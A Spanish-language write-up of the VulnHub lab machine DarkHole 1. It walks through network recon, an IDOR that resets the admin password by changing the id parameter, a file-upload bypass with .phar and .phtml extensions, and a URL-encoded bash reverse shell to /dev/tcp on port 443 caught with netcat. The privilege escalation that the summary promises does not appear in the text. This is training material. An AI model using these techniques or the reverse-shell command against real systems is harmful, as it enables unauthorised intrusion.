---
title: "VulnHub - DarkHole 1"
date: 2025-04-09
platform: "vulnhub"
logo: "/images/vulnhub.png"
tags: ["Linux", "IDOR", "File-Upload-Bypass", "RCE", "Path-Hijacking", "SUID", "Sudo-Abuse"]
summary: "Resolución de la máquina DarkHole 1. Explotaremos una vulnerabilidad IDOR para resetear la contraseña del administrador, obtendremos RCE mediante un bypass en la subida de archivos y escalaremos privilegios mediante Path Hijacking en un binario SUID y abuso de sudoers."
draft: false
---

Esta es la maquina **[[DarkHole 1]]** de **[[Vulnhub]]**. Un laboratorio centrado en vulnerabilidades lógicas web y configuraciones locales inseguras para la escalada de privilegios.

### Resumen de Técnicas Usadas

| **Técnica** | **Herramienta / Concepto** |
| :--- | :--- |
| **Reconocimiento de Red Local** | **[[Arp-Scan]]**, **[[MacChanger]]** |
| **Escaneo de Red y Enumeración** | **[[Nmap]]**, **[[ExtractPorts]]**, **[[whichSystem.py]]** |
| **Enumeración Web y Fuzzing** | **[[WhatWeb]]**, **[[Gobuster]]**, **[[Fuzzing]]** |
| **Vulnerabilidad de Control de Acceso** | **[[IDOR]]** (Cambio de contraseña Admin con **[[Caido]]**) |
| **Ganando Acceso (RCE)** | **[[File Upload Bypass]]** (**[[.phar]]** / **[[.phtml]]**) |
| **Movimiento Lateral** | **[[SUID]]** Binary **[[Path Hijacking]]** (**/home/john/toto**) |
| **Escalada de Privilegios** | **[[Sudo Abuse]]** (Abuso de privilegios de **[[john]]**) |

---

## Creación del Entorno de Trabajo

Para empezar por la maquina lo que primero realizamos es la creación de nuestro entorno de trabajo con los siguientes comandos :

```r title:Entorno_de_Trabajo
❯ mkdir Darkhole1
❯ cd Darkhole1
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ll 
drwxr-xr-x root root 0 B Wed Apr  9 07:54:32 2025  content
drwxr-xr-x root root 0 B Wed Apr  9 07:54:32 2025  exploits
drwxr-xr-x root root 0 B Wed Apr  9 07:54:32 2025  nmap
drwxr-xr-x root root 0 B Wed Apr  9 07:54:32 2025  scripts
```

Y antes de realiza [[Ping]] lo que procederemos hacer es un *escaneo* de nuestra [[Red]], ya que en [[Vulnhub]] lo que hacemos es meter la **Maquina Victima** en nuestro [[VMware]] y esto es diferente a [[Vulnhub]].

### Escaneo con [[Arp-Scan]]

Lo que vamos ha hacer es ver que esta conectado a la **[[Red]] Local** y con esto podremos saber cual es la máquina por cierto *parámetros* que podemos apreciar:

```q title:Arp-Scan
❯ arp-scan -I ens33 -l
Interface: ens33, type: EN10MB, MAC: 00:0c:29:f8:f3:a8, IPv4: 192.168.1.77
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	94:6a:b0:1b:54:f5	Arcadyan Corporation
192.168.1.19	8a:be:a5:4b:6f:26	(Unknown: locally administered)
192.168.1.78	00:0c:29:f8:4e:8a	VMware, Inc.
192.168.1.113	38:ca:84:b8:bb:44	HP Inc.
192.168.1.113	38:ca:84:b8:bb:44	HP Inc. (DUP: 2)
8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.972 seconds (129.82 hosts/sec). 4 responded
```

Con esto lo que podemos apreciar es los equipos que estan conectados a nuestra red y con lo cual podemos identificar la [[IP]] como también podemos ver [[OUI]] que con [[MacChanger]]:

```r title:MacChanger
❯ macchanger -l | grep 'VMware'
1386 - 00:05:69 - VMware, Inc.
3086 - 00:0c:29 - VMware, Inc.
7161 - 00:1c:14 - VMware, Inc
10601 - 00:50:56 - VMware, Inc.
```

y si ponernos los primeros 3 *argumentos* del [[MAC]] de la *maquina* [[VMware]] podemos ver que este se trata de una de la **Máquina Victima**, ya que es la única que esta **conectada**, si hubiera mas de una tendiéramos que probar otras *herramientas*. 

```r title:MacChanger
❯ macchanger -l | grep '00:0c:29' --color
3086 - 00:0c:29 - VMware, Inc.
```

Ahora que sabemos que dirección [[IP]] es la que tenemos que atacar lo que hacemos ahora es meterla en nuestra [[Polybar]] con el siguiente **comando**:

```r title:SetTarget
❯ settarget '192.168.1.78' 'Darkhole1'
```

![[Captura de pantalla 2025-04-09 083403.png]]

---
### Identificación de Sistema Operativo con [[Ping]]
Después de crear nuestro entorno de trabajo lo que procedemos hacer es saber a que tipo de [[Sistema Operativo]] nos estamos enfrentando, ya sea [[Linux]] o [[Windows]], para saber esta información nos podríamos guiar por el [[TTL]] que nos da al realizar un [[Ping]] a la **Maquina Victima** aunque este se podría cambiar pero en [[Vulnhub]] no es el caso.

```r title:Ping
❯ ping -c 1 192.168.1.78
PING 192.168.1.78 (192.168.1.78) 56(84) bytes of data.
64 bytes from 192.168.1.78: icmp_seq=1 ttl=64 time=0.337 ms
--- 192.168.1.78 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.337/0.337/0.337/0.000 ms
```

Y con [[whichSystem.py]] podemos saber mejor de que [[Sistema Operativo]] se trata la **Máquina Virtual** y podemos ver que se trata de una Máquina [[Linux]]:

```r title:WhichSystem.py
❯ whichSystem.py 192.168.1.78
	192.168.1.78 (ttl -> 64): Linux
```

Ya con esto podemos dar por terminado el *primer paso* que es la **creación del entorno de Trabajo** y *escaneo* general de la **Máquina Virtual**.

## Uso de [[0 Ciberseguridad/1 Herramientas y Conceptos/Nmap/Nmap|Nmap]]

A continuación nos meteremos en la carpeta anteriormente creada llamada [[0 Ciberseguridad/1 Herramientas y Conceptos/Nmap/Nmap|Nmap]] :

```r title:Nmap
❯ cd nmap/
```

Una vez dentro de la carpeta [[0 Ciberseguridad/1 Herramientas y Conceptos/Nmap/Nmap|Nmap]] empieza la **enumeración** para reconocer los [[Puerto]]s que están abiertos en el la **Maquina Victima** con el siguiente comando:

```r title:Nmap
❯ nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 192.168.1.78 -oG AllPorts
```

Una vez realizado el primer **escaneo** de la **Maquina Victima** lo que procedemos a hacer es la *extracción* de todos los puertos que nos proporciono dicho **escaneo**,. 

La *extracción* de los [[Puerto]]s que nos proporciono el primer comando lo haremos con una función que tenemos implementada en la [[zshrc]] llamada [[ExtractPorts]] la que hace lo siguiente:

```r title:ExtractPorts
❯ extractPorts AllPorts
	│ File: extractPorts.tmp
	│ 
	│ [*] Extracting information...
	│ 
	│     [*] IP Address: 192.168.1.78
	│     [*] Open ports: 22,80
	│ 
	│ [*] Ports copied to clipboard
	│ 
```

Con lo que nos proporciono podremos ya realizar el siguiente **escaneo** con [[0 Ciberseguridad/1 Herramientas y Conceptos/Nmap/Nmap|Nmap]] :

```r title:Nmap
❯ nmap -p22,80 -sCV 192.168.1.78 -oN Targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-09 08:50 WEST
```

Este **[[Escaneo de Servicios]]** nos proporciona una **mejor** descripción de los **servicios** que están corriendo en los [[Puerto]]s **abiertos**, con un **cat** podremos ver la *información* que nos proporciono este **escaneo**:  

```r title:Targeted
❯ cat Targeted -l js --style plain
# Nmap 7.94SVN scan initiated Wed Apr  9 08:50:00 2025 as: nmap -p22,80 -sCV -oN Targeted 192.168.1.78
Nmap scan report for darkhole.home (192.168.1.78)
Host is up (0.00023s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e4:50:d9:50:5d:91:30:50:e9:b5:7d:ca:b0:51:db:74 (RSA)
|   256 73:0c:76:86:60:63:06:00:21:c2:36:20:3b:99:c1:f7 (ECDSA)
|_  256 54:53:4c:3f:4f:3a:26:f6:02:aa:9a:24:ea:1b:92:8c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: DarkHole
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 00:0C:29:F8:4E:8A (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr  9 08:50:07 2025 -- 1 IP address (1 host up) scanned in 6.84 seconds
```

Como podemos ver en el archivo *Targeted* podemos apreciar que la *direccion* [[IP]] tiene un alojamiento en el [[Puerto 80]], esto significa que tiene un [[Servicio Web]] **abierto** con el [[Protocolos]] [[HTTP]].

---

## Uso de [[WhatWeb]]

Para poder seguir **enumerando** podemos utilizar **[[WhatWeb]]** para saber los distintos [[servicio]]s que puede ser que estén corriendo **por detrás** de la pagina [[web]] que esta creada y que no se vieron anteriormente:

```r title:WhatWeb
❯ whatweb -v 192.168.1.78
WhatWeb report for http://192.168.1.78
Status    : 200 OK
Title     : DarkHole
IP        : 192.168.1.78
Country   : RESERVED, ZZ

Summary   : Apache[2.4.41], Cookies[PHPSESSID], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)]

Detected Plugins:
❯ whatweb -v 192.168.1.78
WhatWeb report for http://192.168.1.78
Status    : 200 OK
Title     : DarkHole
IP        : 192.168.1.78
Country   : RESERVED, ZZ

Summary   : Apache[2.4.41], Cookies[PHPSESSID], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)]

Detected Plugins:
[ Apache ]
	The Apache HTTP Server Project is an effort to develop and 
	maintain an open-source HTTP server for modern operating 
	systems including UNIX and Windows NT. The goal of this 
	project is to provide a secure, efficient and extensible 
	server that provides HTTP services in sync with the current 
	HTTP standards. 

	Version      : 2.4.41 (from HTTP Server Header)
	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ Cookies ]
	Display the names of cookies in the HTTP headers. The 
	values are not returned to save on space. 

	String       : PHPSESSID

[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	OS           : Ubuntu Linux
	String       : Apache/2.4.41 (Ubuntu) (from server string)

HTTP Headers:
	HTTP/1.1 200 OK
	Date: Wed, 09 Apr 2025 08:03:23 GMT
	Server: Apache/2.4.41 (Ubuntu)
	Set-Cookie: PHPSESSID=58mthk4ncc0gm7shq3pjp8teeu; path=/
	Expires: Thu, 19 Nov 1981 08:52:00 GMT
	Cache-Control: no-store, no-cache, must-revalidate
	Pragma: no-cache
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 302
	Connection: close
	Content-Type: text/html; charset=UTF-8
```

Con esto podemos ver mas al detalle lo que tiene la pagina web.

## Uso de [[Fuzzing]] 

Ahora lo que podemos también *plantearnos* es usar **[[Gobuster]]** para hacer **[[Fuzzing]]** a la **[[Pagina Web]]** para intentar ver los posibles **directorios** que están *escondidos detrás* de la **[[Pagina Web]]** y si podemos encontrar algo *interesante* en ellos.

```r title:Fuff
❯ gobuster dir -u http://192.168.1.78/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 200 -x .php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.78/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 810]
/register.php         (Status: 200) [Size: 2886]
/login.php            (Status: 200) [Size: 2507]
/upload               (Status: 301) [Size: 313] [--> http://192.168.1.78/upload/]
/css                  (Status: 301) [Size: 310] [--> http://192.168.1.78/css/]
/js                   (Status: 301) [Size: 309] [--> http://192.168.1.78/js/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config               (Status: 301) [Size: 313] [--> http://192.168.1.78/config/]
/dashboard.php        (Status: 200) [Size: 21]
/.php                 (Status: 403) [Size: 277]
Progress: 156212 / 2547668 (6.13%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 163030 / 2547668 (6.40%)
===============================================================
Finished
===============================================================
```

Nos ha encontrado bastantes archivos [[PHP]] y también **Directorios** que podría sernos útiles.

## Exploración y Explotación del Servicio [[HTTP]] ([[Pagina Web]])

Como pudimos ver anteriormente podemos ver que la **Máquina Victima** tiene un [[Servicio]] corriendo en el que se trata del [[Servicio]] [[HTTP]] en el cual se aloja en el un aplicación como puedes ser [[Apache]] o [[Nginx]], pero como vimos en el [[WhatWeb]] podemos ver que se trata de [[Apache]] 2.4.41

Al entrar con la direccion [[IP]] podemos ver lo siguient e

`{r title:URL}http://192.168.1.78`

![[Pasted image 20250409094659.png]]

Y con la información que nos proporciono [[Gobuster]] podemos meternos mediante cambios en la [[URL]] en los directorios o archivos [[PHP]].

`{r title:URL}http://192.168.1.78/login.php`

![[Pasted image 20250409095136.png]]

`{r title:URL}http://192.168.1.78/dashboard.php`

![[Pasted image 20250409095100.png]]

`{r title:URL}http://192.168.1.78/dashboard.php`

![[Pasted image 20250409095043.png]]

`{r title:URL}http://192.168.1.78/logout.php`

Lo que hace el *logout.php* es redirigirte al *login.php*, ya que no estamos *registrados* ni *logeados* 

Nos registramos en la [[Pagina Web]] para ver lo que hace y saber si podemos hacer algo.

![[Pasted image 20250409095513.png]]

Una vez registrado en la [[Pagina Web]] podemos ver ahora si que si la [[URL]] que anteriormente no nos dejaba entrar:

`{r title:URL}http://192.168.1.78/dashboard.php`

solo que ahora nos da mas detalles de estos :

`{r title:URL}http://192.168.1.78/dashboard.php?id=2`

![[Pasted image 20250409095714.png]]

Como se puede ver el **ID** de las *personas* y yo estoy *alojada* en la **ID=2**, por lo tanto podemos intentar cambiarlo en la misma [[URL]] a ver si es que tiene esa **vulnerabilidad**.

Lo intentamos y lo que nos aparece es lo siguiente :

![[Pasted image 20250409100108.png]]

Eso da a entender que la [[pagina web]] esta **protegida** por ese tipo de *ataques Básicos*.

## Uso de [[Caido]]

Ahora usaremos la **aplicación** [[Caido]] para hacer un [[man-in-the-middle]] con la [[pagina web]] y poder *trastear* con la pagina y mirar las posibles **peticiones**.

Probamos diversas opciones en el panel de *Details* por si podríamos ver alguna **vulnerabilidad** y vemos que no se podía hacer nada :

![[Pasted image 20250409102437.png]]

Ahora es el turno al panel de **Password** y mirar si este tiene algún tipo de **vulnerabilidad**.

![[Pasted image 20250409102626.png]]

Lo que podemos observar es que esta haciendo una **funciones** muy *raras* y posiblemente **vulnerables** para intentar el cambio de **contraseñas**, lo de esto podia ser lo siguiente:

``` r title:Posible_Vulnerabilidad
password=test1234&id=2
#Si probamos con cambiar el id al 1 que podria ser el primer id que se hizo que por norma general puede ser admin
password=test1234&id=1
```

Cuando le damos a SEND en el caido para darle la solicitud nos sale que el codigo de estado 200 OK 

![[Pasted image 20250409103039.png]]

Asi que podriamos probar a hacer lo mismo en el apartado de intercepted para darle despues al Forward y mirar si se a ejecutado correctamente.

![[Pasted image 20250409103339.png]]

Probamos a ver si a funcionado.

![[Pasted image 20250409103420.png]]

Y como podemos ver a **funcionado** **correctamente** y hemos accedido al *Dashboard* del usuario **Admin** y lo que vemos es que este tiene una **función** mas que no tenia el *usuario* que nos creamos anteriormente.

En esta nueva función podemos *subir* **archivos**, con lo cual podemos intentar hacer una archivo en el cual nos pueda dar pie a hacer una [[Reverse Shell]].

Nos dice que solo podemos subir archivos *jpg,png,gif* pero probé con **un archivo** que tenia que se llamaba **root.txt** y me dejo subirlo asi que con [[Caido]] podemos probar con un *automate* que lo que hace es hacer una lista de los **.Extension** que queramos subir y nos lo sube y en la pagina web donde se almacenan los Upload podemos ver si nos subió con éxito todas la extensiones estilo [[PHP]] a ese repositorio y asi poder hacer una ejecución de comando para emplear posteriormente un [[Reverse Shell]]

![[Pasted image 20250409111145.png]]

![[Pasted image 20250409111336.png]]

Le damos a *Run* para que suba los **archivos** y miramos en la **ubicación** de la [[URL]] donde se aloja los archivos subidos si están alojados.

`{r title:URL}http://192.168.1.78/upload/`

![[Pasted image 20250409111451.png]]


Ahora lo que tenemos que hacer es probar cual de todos estos que hemos alojado nos sirve para emplear la [[Reverse Shell]].

Uno de los que **funciona** es el *archivo* **cmd.phar**

![[Pasted image 20250409111821.png]]

Pero podemos probar con mas para saber a que mas archivos le pasa de los que le hemos pasado.
#### Archivos que dejan ejecucion del cmd.php modificado
`{js title:Funcionan}cmd.phar`
`{r title:No-Funcionan}cmd.php3`
`{r title:No-Funcionan}cmd.php4`
`{r title:No-Funcionan}cmd.php5`
`{r title:No-Funcionan}cmd.php`
`{js title:Funcionan}cmd.phtml`

Despues de saber cuales son las funcionales podemos hacer un una [[Reverse Shell]] con lo siguinete :

``` r title:Reverse_Shell
http://192.168.1.78/upload/cmd.phar?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.77/443%200%3E%261%27

#EJECUTAMOS ESTO MIENTRAS NUESTRO CMD ESTE ESCUCHANDO CON NETCAT 

❯ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.1.77] from (UNKNOWN) [192.168.1.78] 41726
bash: cannot set terminal process group (966): Inappropriate ioctl for device
bash: no job control in this shell
www-data@darkhole:/var/www/html/upload$ 
```

Una vez hecho eso se nos abrirá un cmd en nuestra [[Terminal]].